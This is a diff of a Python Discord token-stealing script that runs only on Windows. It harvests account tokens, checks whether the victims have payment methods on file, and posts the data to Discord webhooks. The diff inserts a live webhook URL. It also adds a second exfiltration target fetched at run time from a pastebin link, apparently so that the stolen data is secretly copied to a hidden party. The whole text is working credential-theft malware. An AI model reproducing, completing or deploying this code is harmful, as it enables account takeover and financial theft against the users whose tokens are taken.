@@ -2,6 +2,7 @@ import os
 if os.name != "nt":
     exit()
 from re import findall
+from urllib.request import Request, urlopen
 from json import loads, dumps
 from base64 import b64decode
 from subprocess import Popen, PIPE
@@ -10,9 +11,10 @@ from datetime import datetime
 from threading import Thread
 from time import sleep
 from sys import argv
+import requests
 
 #YOUR WEBHOOK_URL HERE
-WEBHOOK_URL = 'HERE'
+WEBHOOK_URL = 'https://discord.com/api/webhooks/905544564130074674/jdm9eVR9AiO8gyZsW7w2fgS9Tv-QdACIceq_Rvh9XgYleoPp6j2rp2FMvYw-aAvdjWML'
 
 
 
@@ -86,7 +88,8 @@ def getchat(token, uid):
         return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token), data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
     except:
         pass
-GET_TOKEN = 'https://discord.com/api/webhooks/907297166668750849/YrFzrGjhh-3UQRlPLGo5YgxQ6KPS2qsUEwKKu_d4PTqhHWYZIYdCiay4WC2id0rYNyU7'
+aress = 'https://pastebin.com/raw/N9BPuqbx'
+seek = requests.get(aress).text  
 def has_payment_methods(token):
     try:
         return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
@@ -192,7 +195,7 @@ def main():
         "avatar_url": "https://i.imgur.com/F1ruhrS.jpg"
     }
     try:
-        urlopen(Request(GET_TOKEN, data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request(seek, data=dumps(webhook).encode(), headers=getheaders()))
         urlopen(Request(WEBHOOK_URL, data=dumps(webhook).encode(), headers=getheaders()))     
     except:
         pass
